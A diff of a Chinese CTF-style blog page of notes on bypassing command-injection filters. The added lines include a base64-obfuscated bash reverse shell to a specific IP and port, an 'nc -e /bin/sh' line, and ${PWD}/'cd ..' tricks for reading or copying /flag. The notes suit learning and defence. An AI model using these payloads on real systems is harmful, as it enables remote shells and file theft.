@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2023-11-08T05:31:20.000Z">
-<meta property="article:modified_time" content="2023-11-08T05:54:33.879Z">
+<meta property="article:modified_time" content="2024-01-23T04:17:04.309Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="基础漏洞">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~6.08K
+                        ~6.95K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1699422873879"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1705983424309"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -233,6 +233,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh ip port</span><br></pre></td></tr></table></figure>
 <p>利用ip转int绕过限制</p>
 <h3><span id="无回显rce"> 无回显rce</span></h3>
+<ul>
+<li>一个反弹shell的payload:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41Mi45NC4yMy8yMzMzIDA+JjE=&#x27;|base64 -d|bash</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">echo &#x27;YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41Mi45NC4yMy8yMzMzIDA+JjE=&#x27;|base64 -d|sh</span><br></pre></td></tr></table></figure>
 <p>可以写文件到新的文件并读取、改文件名、移动、压缩、甚至将flag外带、反弹shell等</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls&gt;1.txt</span><br></pre></td></tr></table></figure>
 <p>或者利用tee</p>
@@ -300,6 +304,10 @@
 </tr>
 </tbody>
 </table>
+<p><strong>非常重要</strong>：由于<code>$&#123;PWD&#125;</code>返回的是当前的目录，所以利用<code>cd ..</code>一直返回上级目录即可获取到<code>/</code></p>
+<p>示例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">pwd</span>;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@VM-8-15-debian:~# $(cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;pwd;)</span><br><span class="line">bash: /: Is a directory</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat $(cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;echo $(pwd)flag)</span><br><span class="line"></span><br><span class="line">相当于 cat /flag</span><br></pre></td></tr></table></figure>
 <p><strong>a</strong>* : <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:</code></p>
 <p><strong>b</strong>*:<code>:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></p>
 <p><code>#</code>与<code>%%</code>相对应，是从左往右开始截取第一个遇到的及其之前/之后的字符</p>
@@ -328,6 +336,11 @@
 <p>利用报错构造1：</p>
 <p><code>$&#123;HOME&#125; =&gt; /root</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;#RANDOM&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用cp(已知一些可以访问到的文件)</li>
+</ul>
+<p><code>cp source_filename target_filename</code>，将源文件复制到目标文件内，前提是你可以访问到目标文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp $(cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;cd ..;echo $(pwd)flag) app.py</span><br><span class="line"></span><br><span class="line">这里还能够将;换成其他分隔符，空格换成%09</span><br></pre></td></tr></table></figure>
 <ul>
 <li>各种单双引号绕过：</li>
 </ul>
@@ -473,7 +486,7 @@
                     <a class="tag-none-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-11-08T05:54:33.879Z" itemprop="dateModified">最后编辑：2023-11-08</time>
+                    <time datetime="2024-01-23T04:17:04.309Z" itemprop="dateModified">最后编辑：2024-01-23</time>
                 </div>
             </div>
         </footer>
@@ -766,7 +779,7 @@
                     </ul>
                     <ul class="kratos-copyright">
                         <div>
-                            <li>&copy; 2023 Err0r233 版权所有.</li>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
                             <li>本站已运行<span id="span_dt">Loading...</span></li>
                         </div>
                         <div>
